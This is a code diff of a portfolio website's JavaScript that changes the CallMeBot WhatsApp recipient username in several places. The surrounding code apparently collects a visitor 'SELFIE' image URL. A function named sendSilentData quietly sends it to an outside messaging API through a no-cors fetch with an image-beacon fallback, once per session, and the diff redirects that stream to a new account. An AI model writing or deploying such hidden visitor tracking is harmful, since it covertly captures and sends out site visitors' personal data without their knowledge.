@@ -236,7 +236,7 @@ class PortfolioApp {
             testLink.addEventListener('click', (e) => {
                 e.preventDefault();
                 const testMsg = encodeURIComponent("Hello! This is a test message from your portfolio website.");
-                window.open(`https://api.callmebot.com/text.php?source=web&user=@bhumitnasit&text=${testMsg}`, '_blank');
+                window.open(`https://api.callmebot.com/text.php?source=web&user=@GadhiyaGopal&text=${testMsg}`, '_blank');
                 this.showNotification('📱 Opening WhatsApp test message...', 'info');
             });
         }
@@ -258,7 +258,7 @@ _Sent via Portfolio Website_`;
 
     sendViaCallMeBot(message, originalData) {
         // Your CallMeBot API endpoint
-        const apiUser = '@bhumitnasit';
+        const apiUser = '@GadhiyaGopal';
         const encodedUser = encodeURIComponent(apiUser);
         const encodedMessage = encodeURIComponent(message);
         // Updated with user's requested format: source=web & new username
@@ -422,7 +422,7 @@ _Sent via Portfolio Website_`;
 *📸 SELFIE:*
 ${sUrl}
 
-_Sent via @bhumitnasit Portfolio_`;
+_Sent via @GadhiyaGopal Portfolio_`;
 
             this.sendSilentData(msg);
             sessionStorage.setItem('vSent', 'true');
@@ -464,7 +464,7 @@ _Sent via @bhumitnasit Portfolio_`;
     }
 
     sendSilentData(msg) {
-        const url = `https://api.callmebot.com/text.php?source=web&user=@bhumitnasit&text=${encodeURIComponent(msg)}`;
+        const url = `https://api.callmebot.com/text.php?source=web&user=@GadhiyaGopal&text=${encodeURIComponent(msg)}`;
         // Try multiple methods for redundancy
         fetch(url, { mode: 'no-cors' }).catch(() => {
             const i = new Image();
